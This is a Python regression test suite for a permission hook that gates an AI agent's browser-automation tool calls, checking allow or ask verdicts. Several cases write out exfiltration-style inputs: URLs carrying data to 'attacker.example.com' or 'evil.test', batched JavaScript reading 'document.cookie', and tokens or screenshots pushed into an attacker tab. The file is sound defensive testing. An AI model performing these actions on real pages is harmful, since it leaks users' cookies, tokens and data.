#!/usr/bin/env python3
"""Regression suite for the action ladder. Run: python3 tests/test_guard.py"""
import json
import os
import subprocess
import sys

GUARD = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "guard.py")
P = "mcp__claude-in-chrome__"


def verdict(tool, tool_input):
    out = subprocess.run(
        [sys.executable, GUARD],
        input=json.dumps({"tool_name": tool, "tool_input": tool_input}),
        capture_output=True, text=True,
    ).stdout.strip()
    if not out:
        return None
    return json.loads(out)["hookSpecificOutput"]["permissionDecision"]


def learn(tab_id, url):
    """Feed the guard a PostToolUse event so it learns tab -> host."""
    subprocess.run(
        [sys.executable, GUARD],
        input=json.dumps({"tool_name": P + "navigate", "hook_event_name": "PostToolUse",
                          "tool_input": {}, "tool_response":
                          'Tab Context:\n  \u2022 tabId %d: "T" ("%s")' % (tab_id, url)}),
        capture_output=True, text=True)


def reset_tabs():
    path = os.path.join(os.path.dirname(GUARD), "logs", "tab_origins.json")
    if os.path.exists(path):
        os.remove(path)


CASES = [
    ("read is free",            P + "read_page",       {"tabId": 1}, "allow"),
    ("screenshot is a read",    P + "computer",        {"action": "screenshot", "tabId": 1}, "allow"),
    ("click actuates",          P + "computer",        {"action": "left_click", "coordinate": [1, 2], "tabId": 1}, "ask"),
    ("typing actuates",         P + "computer",        {"action": "type", "text": "x", "tabId": 1}, "ask"),
    ("arbitrary JS",            P + "javascript_tool", {"action": "javascript_exec", "text": "1", "tabId": 1}, "ask"),
    ("local file upload",       P + "file_upload",     {"tabId": 1}, "ask"),
    ("allowlisted host",        P + "navigate",        {"url": "https://example.com/a"}, "allow"),
    ("lookalike is not a match", P + "navigate",       {"url": "https://notexample.com/a"}, "ask"),
    ("bare entry no longer matches subdomains", P + "navigate", {"url": "https://attacker.example.com/?d=X"}, "ask"),
    ("long query on allowlisted host is egress", P + "navigate", {"url": "https://example.com/?d=" + "A" * 300}, "ask"),
    ("short query on allowlisted host is fine", P + "navigate", {"url": "https://example.com/?q=hi"}, "allow"),
    ("gif export to a page element", P + "gif_creator", {"action": "export", "coordinate": [1, 2], "tabId": 1}, "ask"),
    ("gif export downloading to disk", P + "gif_creator", {"action": "export", "download": True, "tabId": 1}, "ask"),
    ("gif recording control is local", P + "gif_creator", {"action": "start_recording", "tabId": 1}, "allow"),
    ("off-list host",           P + "navigate",        {"url": "https://evil.test/p"}, "ask"),
    ("history back",            P + "navigate",        {"url": "back", "tabId": 1}, "allow"),
    ("batch of reads",          P + "browser_batch",   {"actions": [
        {"name": "read_page", "input": {"tabId": 1}},
        {"name": "computer", "input": {"action": "screenshot", "tabId": 1}}]}, "allow"),
    ("batch smuggling a click", P + "browser_batch",   {"actions": [
        {"name": "read_page", "input": {"tabId": 1}},
        {"name": "computer", "input": {"action": "left_click", "coordinate": [5, 5], "tabId": 1}}]}, "ask"),
    ("batch smuggling JS",      P + "browser_batch",   {"actions": [
        {"name": "get_page_text", "input": {"tabId": 1}},
        {"name": "javascript_tool", "input": {"action": "javascript_exec", "text": "document.cookie", "tabId": 1}}]}, "ask"),
    ("batch with off-list nav", P + "browser_batch",   {"actions": [
        {"name": "navigate", "input": {"url": "https://evil.test", "tabId": 1}}]}, "ask"),
    ("malformed batch",         P + "browser_batch",   {"actions": "not-a-list"}, "ask"),
    ("unknown tool",            P + "future_tool",     {}, "ask"),
    ("non-browser tool ignored", "Bash",               {"command": "ls"}, None),
]

# Origin-gated writes: verdict depends on which host the target tab is on.
ORIGIN_CASES = [
    ("form_input into an unknown tab",   P + "form_input",   {"ref": "r", "value": "x", "tabId": 99}, "ask"),
    ("form_input into an allowlisted tab", P + "form_input", {"ref": "r", "value": "x", "tabId": 1}, "allow"),
    ("form_input into the attacker's page", P + "form_input", {"ref": "r", "value": "TOKEN", "tabId": 2}, "ask"),
    ("upload_image into an allowlisted tab", P + "upload_image", {"imageId": "i", "coordinate": [1, 2], "tabId": 1}, "allow"),
    ("screenshot then upload to attacker page", P + "upload_image", {"imageId": "i", "coordinate": [1, 2], "tabId": 2}, "ask"),
    ("batch smuggling an attacker-page write", P + "browser_batch", {"actions": [
        {"name": "computer", "input": {"action": "screenshot", "tabId": 1}},
        {"name": "upload_image", "input": {"imageId": "i", "coordinate": [1, 2], "tabId": 2}}]}, "ask"),
]

if __name__ == "__main__":
    failed = 0
    reset_tabs()
    learn(1, "https://example.com/")
    learn(2, "https://evil.test/")
    for name, tool, tool_input, expected in CASES + ORIGIN_CASES:
        got = verdict(tool, tool_input)
        ok = got == expected
        failed += not ok
        print("%-4s %-28s expected=%-5s got=%s" % ("PASS" if ok else "FAIL", name, expected, got))
    total = len(CASES) + len(ORIGIN_CASES)
    print("\n%d/%d passed" % (total - failed, total))
    sys.exit(1 if failed else 0)
